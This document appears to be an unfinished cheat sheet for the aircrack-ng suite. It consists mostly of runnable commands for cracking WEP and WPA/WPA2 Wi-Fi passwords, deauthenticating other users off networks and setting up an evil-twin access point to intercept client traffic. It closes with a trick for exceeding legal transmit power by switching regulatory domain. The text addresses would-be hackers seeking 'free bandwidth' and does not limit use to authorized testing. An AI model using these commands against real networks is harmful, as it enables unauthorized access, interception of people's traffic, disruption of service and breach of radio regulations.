# Aircrack-ng

TODO: Fill this information of covering aircrack-ng suite tools usage

## Help Menu

## Usage

```
# ip link set <interface> down
```

```
# ip link set <interface> up
```

### WEP

WiFi in Monitor mode

```
# airmon-ng start wlan0
```

Search for wireless

```
# airodump-ng mon0
```

Capture or inject

```
# airodump-ng --bssid <bssid> -c <channel> -w WEPcrack mon0
```

Inject ARP to capture IVs

```
# aireplay-ng -e -b <bssid> -h <mac> mon0
```

Crack (needs several thousand IVs)

```
# aircrack-ng WEPcrack.cap
```

### WPA/WPA2

Start airmon-ng

```
# airmon-ng start wlan0
```

Run airodump

```
# airodump-ng -i mon0
```

Find the network you want to access then wait for `WPA handshake: ##:##:##:##:##:##`

```
# airodump-ng --bssid <bssid> -c 11 -w cowpatty.cap mon0
```

Kick someone else off

```
# aireplay-ng -0 100 -a <bssid> mon0
```

Dictionary or other, crack the password

```
# aircrack-ng WPAcrack.cap -w <wordlist>
```

Pipe STDIN to aircrack-ng for password cracking

```
$ crunch <min-len> <max-len> -t <placeholder_characters> | aircrack-ng -w - file.cap -e <ESSID>
```

### Evil Twin

Our first task will be to creating an evil twin access point. Many new hackers are anxious to crack Wi-Fi passwords to gain some free bandwidth (don't worry, we'll get to that), but there are so many other Wi-Fi hacks that are far more powerful and put so much more at risk than a bit of bandwidth.

What's an Evil Twin AP?
The evil twin AP is an access point that looks and acts just like a legitimate AP (using the same SSID) and entices the end-user to connect to our access point. Our aircrack-ng suite has a tool, airbase-ng, that can be used to convert our wireless adapter into an access point. This is a powerful client-side hack that will enable us to see all of the traffic from the client and conduct a man-in-the middle attack.

Many corporate offices, hotels, coffee shops, etc. employ this type of security.

Start airmon

```
iwconfig
airmon-ng start wlan0
```

Start airdump then wait for ssid to show 

```
airodump-ng mon0
```

Create new AP with same ssid and mac

```
airbase-ng -a <bssid> --essid <ssid> -c <channel> mon0
```

Deauth your target

```
aireplay-ng --deauth 0 -a <bssid>
```

Run your AP at max power (27 is max 'legal' power)

```
iwconfig wlan0 txpower 27 
```

Bypass restrictions is by setting to another domain/country then wait for connection

```
iw reg set BO

iwconfig wlan0 txpower 30
```
